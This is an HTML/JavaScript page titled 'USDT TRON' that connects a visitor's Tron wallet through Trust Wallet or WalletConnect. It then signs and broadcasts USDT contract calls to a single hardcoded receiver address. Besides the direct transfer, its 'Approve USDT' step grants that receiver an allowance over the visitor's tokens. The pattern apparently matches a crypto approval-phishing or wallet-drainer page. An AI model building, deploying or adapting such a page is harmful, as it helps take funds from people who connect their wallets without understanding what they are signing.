<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>USDT TRON</title>

<link rel="icon" href="https://raw.githubusercontent.com/salmanraheem-dev/bestforlast/refs/heads/main/public/logo.png">

<script src="https://unpkg.com/@walletconnect/sign-client@2.17.0/dist/index.umd.js"></script>

<style>
body{margin:0;background:#0d0f12;color:#fff;font-family:-apple-system}
.header{padding:16px;text-align:center;border-bottom:1px solid #222}
.container{padding:16px}
.box{border:1px solid #2a2d33;border-radius:12px;padding:14px;margin-bottom:16px;background:#121417}
.label{font-size:12px;color:#888;margin-bottom:6px}
.input{width:100%;background:none;border:none;color:#fff;font-size:16px}
.btn{width:100%;padding:14px;margin-top:10px;border-radius:20px;border:none;font-weight:bold}
.primary{background:#2ecc71;color:#000}
.secondary{background:#444;color:#fff}
.status{font-size:12px;color:#aaa;margin-bottom:10px}
.receiver{color:#ccc;font-size:13px}
</style>
</head>

<body>

<div class="header">USDT (TRON)</div>

<div class="container">

<div id="status" class="status">Initializing...</div>

<div class="box">
  <div class="label">Receiver</div>
  <div class="receiver">TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV</div>
</div>

<div class="box">
  <div class="label">Amount</div>
  <input id="amount" class="input" placeholder="0.00" type="number">
</div>

<button id="connectBtn" class="btn secondary" onclick="connectWallet()">Connect Wallet</button>
<button id="approveBtn" class="btn primary" onclick="approveUSDT()" disabled>Approve USDT</button>
<button id="sendBtn" class="btn primary" onclick="sendUSDT()" disabled>Send USDT</button>

</div>

<script>
// CONFIG
const PROJECT_ID="171db6da15a54effc1b4a06f889a3c3f";
const TRON_CHAIN="tron:0x2b6653dc";
const USDT="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const RECEIVER="TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
const APP_URL=location.href;

let client=null, session=null, address=null;

// UI
function setStatus(t){document.getElementById("status").innerText=t;}
function enableActions(){
  document.getElementById("approveBtn").disabled=false;
  document.getElementById("sendBtn").disabled=false;
  document.getElementById("connectBtn").style.display="none";
}

// 🔥 SAFE SignClient loader (fixes your error)
function getSignClient(){
  if(window.SignClient?.init) return window.SignClient;
  if(window.WalletConnectSignClient?.SignClient?.init) return window.WalletConnectSignClient.SignClient;
  if(window.walletconnect?.SignClient?.init) return window.walletconnect.SignClient;

  for(let k in window){
    try{
      if(window[k]?.SignClient?.init) return window[k].SignClient;
    }catch{}
  }
  return null;
}

// 🚀 AUTO INIT (Binance-like)
async function init(){
  try{
    // Trust Wallet browser
    if(window.tronWeb?.defaultAddress?.base58){
      address=window.tronWeb.defaultAddress.base58;
      setStatus("Connected: "+short(address));
      enableActions();
      return;
    }

    const SignClient=getSignClient();
    if(!SignClient){
      setStatus("WalletConnect loading...");
      return;
    }

    client=await SignClient.init({
      projectId:PROJECT_ID,
      metadata:{
        name:"USDT Sender",
        description:"TRON",
        url:APP_URL,
        icons:["https://raw.githubusercontent.com/salmanraheem-dev/bestforlast/refs/heads/main/public/logo.png"]
      }
    });

    // restore session
    const sessions=client.session.getAll();
    if(sessions.length){
      session=sessions[0];
      address=session.namespaces.tron.accounts[0].split(":")[2];
      setStatus("Connected: "+short(address));
      enableActions();
    }else{
      setStatus("Tap connect");
    }

  }catch(e){
    console.error(e);
    setStatus("Init error");
  }
}

// CONNECT (user click → popup)
async function connectWallet(){
  try{
    const {uri,approval}=await client.connect({
      requiredNamespaces:{
        tron:{methods:["tron_signTransaction"],chains:[TRON_CHAIN],events:[]}
      }
    });

    if(uri){
      window.location.href="https://link.trustwallet.com/wc?uri="+encodeURIComponent(uri);

      // Android return fix
      setTimeout(()=>{window.location.href=APP_URL;},2500);
    }

    session=await approval();
    address=session.namespaces.tron.accounts[0].split(":")[2];

    setStatus("Connected: "+short(address));
    enableActions();

  }catch(e){
    console.error(e);
    setStatus("Connection failed");
  }
}

// APPROVE (limited amount)
async function approveUSDT(){
  const amount=document.getElementById("amount").value;
  if(!amount) return alert("Enter amount");

  const hexAddr=base58ToHex(RECEIVER).replace("41","").padStart(64,"0");
  const hexAmt=Math.floor(amount*1e6).toString(16).padStart(64,"0");

  await sendTx("approve(address,uint256)",hexAddr+hexAmt);
  alert("Approved");
}

// SEND
async function sendUSDT(){
  const amount=document.getElementById("amount").value;
  if(!amount) return alert("Enter amount");

  const hexAddr=base58ToHex(RECEIVER).replace("41","").padStart(64,"0");
  const hexAmt=Math.floor(amount*1e6).toString(16).padStart(64,"0");

  await sendTx("transfer(address,uint256)",hexAddr+hexAmt);
  alert("Sent");
}

// CORE TX
async function sendTx(selector,params){
  const tx=await fetch("https://api.trongrid.io/wallet/triggersmartcontract",{
    method:"POST",
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({
      owner_address:address,
      contract_address:USDT,
      function_selector:selector,
      parameter:params,
      fee_limit:100000000,
      visible:true
    })
  }).then(r=>r.json());

  let signed;

  if(window.tronWeb){
    signed=await window.tronWeb.trx.sign(tx.transaction);
  }else{
    signed=await client.request({
      topic:session.topic,
      chainId:TRON_CHAIN,
      request:{
        method:"tron_signTransaction",
        params:{address,transaction:tx.transaction}
      }
    });
  }

  await fetch("https://api.trongrid.io/wallet/broadcasttransaction",{
    method:"POST",
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify(signed)
  });
}

// helpers
function short(a){return a.slice(0,6)+"..."+a.slice(-4);}
const ALPHABET="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
function base58ToHex(addr){
  let num=BigInt(0);
  for(let c of addr){num=num*58n+BigInt(ALPHABET.indexOf(c));}
  let hex=num.toString(16);
  if(hex.length%2) hex="0"+hex;
  return "41"+hex.slice(2,-8);
}

// start
init();
</script>

</body>
</html>
